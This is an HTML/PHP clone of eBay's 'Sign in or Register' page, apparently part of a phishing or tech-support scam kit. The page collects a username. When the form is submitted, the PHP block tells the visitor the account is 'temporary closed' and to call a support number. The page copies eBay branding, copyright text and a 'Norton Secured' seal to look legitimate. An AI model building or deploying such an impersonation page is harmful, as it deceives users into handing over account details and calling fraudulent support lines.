﻿<!DOCTYPE html>
<html lang="en" class="font-marketsans">
  <head>
   
    <link rel="dns-prefetch" data-savepage-href="//ir.ebaystatic.com" href="">
    <link rel="dns-prefetch" data-savepage-href="//secureir.ebaystatic.com" href="">
    <link rel="dns-prefetch" data-savepage-href="//i.ebayimg.com" href="">
    <link rel="dns-prefetch" data-savepage-href="//rover.ebay.com" href="">
    <script async="" data-savepage-src="https://ir.ebaystatic.com/rs/v/dxtuvtkk2q3hpkc1xveeo13iaek.js"></script>
    <script></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="utf-8">
    <title>Sign in or Register | eBay</title>
    <script nonce=""></script>
    <link rel="canonical" data-savepage-href="https://www.ebay.com/signin/" href="">
    <style nonce="">
      .font-marketsans body {
        font-family: "Market Sans", Arial, sans-serif;
      }
    </style>
    <link rel="stylesheet" href="css/style.css">
    <script nonce=""></script>
    <style data-savepage-href="https://ir.ebaystatic.com/rs/v/hkfadhsvci5qlkf4nakqtfxs2y5.css?proc=DU:N" type="text/css"></style>
    <script></script>
    <style type="text/css">
      #glance_stop_btn.insession:before {
        content: Stop sharing;
      }

      #start-cobrowse {
        background: none !important;
        color: #0654ba;
        border: none;
        padding: 0 !important;
        font: inherit;
        border-bottom: 1px solid #0654ba;
        cursor: pointer;
      }
    </style>
    </style>
    

  </head>
  <body cz-shortcut-listen="true">
    <div hidden="">
     
    </div>
    <div id="SkSurvey" class="align-right">
      <a id="SkSurveyLink" href="https://connect.ebay.com/srv/survey/a/reg.personalized" target="_blank" aria-label="Tell us what you think - Link opens in a new window">Tell us what you think</a>
    </div>
    <div class="global-header">
      <div class="gh-acc-exp-div gh-hide-if-nocss">
        <a id="gh-hdn-stm" class="gh-acc-a" href="#mainContent">Skip to main content</a>
      </div>
 
      <header id="gh" role="banner" class="gh-ui-6-5 gh-flex gh-pre-js gh-w gh-sch-prom gh-minH " data-treatment="">
        <table class="gh-tbl" role="presentation">
          <tbody>
            <tr>
              <td class="gh-td">
               
                <a href="" _sp="m570.l2586" id="gh-la">
                  <img width="100%" style=" position:absolute; top:-35px;left:0" alt="eBay Logo" src="images/ebay1.png" id="gh-logo">
                </a>
              </td>
              <td class="gh-td"></td>
              <td class="gh-td"></td>
              <td class="gh-td"></td>
              <td class="gh-td"></td>
              <td class="sticky_placeholder">
                <ul></ul>
              </td>
            </tr>
          </tbody>
        </table>
    
      </header>
      <div id="widgets-placeholder" class="widgets-placeholder" style="display: block;">
        <div class="gh-module-with-target" data-target-selector="#widgets-placeholder" data-is-first="" data-insert-after="false" data-is-critical="false">
          <span id="dfpWidget"></span>
        </div>
      </div>
      
    </div>
    <div class="body-content">
      <div id="id-first-rendered"></div>
      <noscript>
        <div class=non-js-content-wrapper>
          <section aria-labelledby=s0-16-16-29-0-2-0-status class="page-notice page-notice--attention" role=region>
            <div class=page-notice__header id=s0-16-16-29-0-2-0-status>
              <!--M#s0-16-16-29-0-2-0-3-0-->
              <svg class="icon icon--attention-filled" focusable=false aria-label=Error role=img>
                <defs data-marko-key="@defs s0-16-16-29-0-2-0-3-0">
           
                </defs>
                <use xlink:href=#icon-attention-filled></use>
              </svg>
              <!--M/-->
            </div>
            <div class=page-notice__main>
              <p id=disabled-js-error-msg tabindex=0>You must have Java Script enabled to sign in.</p>
            </div>
          </section>
        </div>
      </noscript>
      <style nonce="">
        .non-js-content-wrapper {
          margin-left: 14px;
          margin-right: 14px;
        }
      </style>
      <div id="mainContent">
        <script type="text/javascript" id="dfpURL" data-savepage-src="data:text/html;charset=utf-8,"></script>
        <div id="ebayin-sunset">
          <section aria-labelledby="s0-16-16-29-5-1-0-status" class="page-notice page-notice--information" role="region">
            <div class="page-notice__header" id="s0-16-16-29-5-1-0-status">
              <svg class="icon icon--information-filled" focusable="false" aria-label="information" role="img">
                <use xlink:href="#icon-information-filled"></use>
              </svg>
            </div>
            <div class="page-notice__main">
              <p>To buy and sell on <a data-savepage-href="" href="">www.ebay.com</a> or other eBay sites internationally, existing users can login using their credentials or new users can register an eBay account on ebay.in. Kindly note you can no longer buy or sell on eBay.in. </p>
            </div>
          </section>
        </div>
        <div class="id-first">
          <div class="signin-intro">
            <h1 id="greeting-msg" class="heading">Hello</h1>
            <span id="signin-reg-msg" tabindex="-1" class="sub-heading">Sign in to eBay or <a id="create-account-link" href="#">create an account</a>
            </span>
          </div>
          <form id="signin-form"   action="#" method="post">
            <div>
              <div>
                <div class="floating-label">
                  <div class="textbox">
                    <input id="userid" required placeholder="Email or username" class="textbox__control textbox__control--fluid" type="text" value="" name="userid" maxlength="64" autocomplete="username">
                  </div>
                </div>
                <br>
                <button id="signin-continue-btn" name="signin" class="btn btn--fluid btn--large btn--primary" type="submit">Continue</button>
              </div>
              <?php
              if(isset($_POST['signin'])){
                echo " <p style='color:red; margin-top:12px; font-size: 15px'>Account temporary closed.. Contact support +1-800-000-0000 </p>";
              }

              ?>
            </div>
            <div class="hide">
              <div class="password-box-wrapper">
                <div class="floating-label">
                  <label for="pass" class="floating-label__label floating-label__label--inline">Password</label>
                  <div class="textbox">
                    <input id="pass" class="textbox__control textbox__control--fluid" type="password" value="" name="pass" autocomplete="current-password" aria-label="Password for null">
                  </div>
                </div>
              </div>
              <br>
              <button id="sgnBt" name="sgnBt" type="submit" class="btn btn--fluid btn--large btn--primary" data-ebayui="" disabled="">Sign in</button>
            </div>
            <div class="social-signin-wrapper">
              <div class="separator">
                <div class="separator-line animate"></div>
                <div id="social-signin-wrapper-separator" class="separator-content animate">
                  <mark>or</mark>
                </div>
              </div>
              <div class="social-signin-buttons-reg">
                <div>
                  <button id="signin_fb_btn" class="scl-btn scl-btn--f btn btn--primary btn--large btn--fluid" type="button">
                    
                    Continue with Facebook
                  </button>
                </div>
                <div>
                  <button id="signin_ggl_btn" class="scl-btn scl-btn--g btn btn--primary btn--large btn--fluid" type="button" >Continue with Google</button>
                </div>
                <div>
                  <button id="signin_appl_btn" class="scl-btn scl-btn--a btn btn--primary btn--large btn--fluid" type="button" >
                    <svg aria-hidden="true" class="scl-logo-apple" width="16px" height="17px">
                      <use xlink:href="#apple-icon-black-square"></use>
                    </svg>Continue with Apple </button>
                </div>
              </div>
            </div>
            <div class="roaming-auth"></div>
            <div class="kmsi-container">
              <input type="hidden" checked="" name="kmsi-unchecked" value="1">
              <label class="checkbox-label" id="kmsi-checkbox-lbl">
                <span class="checkbox custom">
                  <input class="checkbox__control" type="checkbox" id="kmsi-checkbox" name="kmsi" aria-describedby="ssip1 ssip2" checked="" value="1">
                  <span class="checkbox__icon" hidden="">
                    <svg class="checkbox__unchecked" focusable="false" aria-hidden="true">
                      <use xlink:href="#icon-checkbox-unchecked"></use>
                    </svg>
                    <svg class="checkbox__checked" focusable="false" aria-hidden="true">
                      <use xlink:href="#icon-checkbox-checked"></use>
                    </svg>
                  </span>
                </span>Stay signed in </label>
              <label id="ssip1">Using a public or shared device?</label>
              <label id="ssip2">Uncheck to protect your account. <br>
                <a href="" aria-label="Learn more about stay signed in." aria-expanded="false" id="kmsi-learn-more-link">Learn more</a>
              </label>
            </div>
           
   
         
        </div>
        
       
        <div></div>
      </div>
    </div>
    <div id="widget-platform">
      <script type="application/javascript"></script>
      <div id="gh_user" style="display: block;">
        <script></script>
      </div>
    </div>

    <footer id="glbfooter" role="contentinfo" class="gh-w gh-flex">
      <div>
        <div id="rtm_html_1650"></div>
        <div id="rtm_html_1651"></div>
      </div>
      <h2 class="gh-ar-hdn">Additional site navigation</h2>
      <div id="gf-t-box">
        <table class="gf-t" role="presentation">
          <tbody>
            <tr valign="top">
              <td class="gf-legal">Copyright © 1995-2022 eBay Inc. All Rights Reserved. <a href="https://www.ebayinc.com/accessibility/">Accessibility</a>, <a href="https://pages.ebay.com/help/policies/user-agreement.html">User Agreement</a>, <a href="https://pages.ebay.com/help/policies/privacy-policy.html">Privacy</a>, <a href="https://pages.ebay.com/help/account/cookies-web-beacons.html">Cookies</a>, <a href="https://www.ebay.com/adchoice/ccpa">Do not sell my personal information</a> and <a href="https://www.ebay.com/adchoice" id="gf-AdChoice">AdChoice</a>
              </td>
              <td nowrap="" align="center">
                <a title="Verify site's SSL certificate" _exsp="m571.l3943" href="https://seal.digicert.com/seals/popup/?tag=BIEBu4RK&url=www.ebay.com&lang=en&cbr=1641428636813" onclick="this.href='https://seal.digicert.com/seals/popup/?tag=BIEBu4RK&url=#D#&lang=en&cbr=1641428636813'.replace(/#D#/,location.host).replace(/#C#/, Date.now());return true" rel="noreferrer">
                  <i id="gf-norton">Norton Secured - powered by DigiCert</i>
                </a>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
      <!--[if lt IE 9]>
																																																									</div>
																																																									<![endif]-->
    </footer>
    

																																																									
  </body>
</html>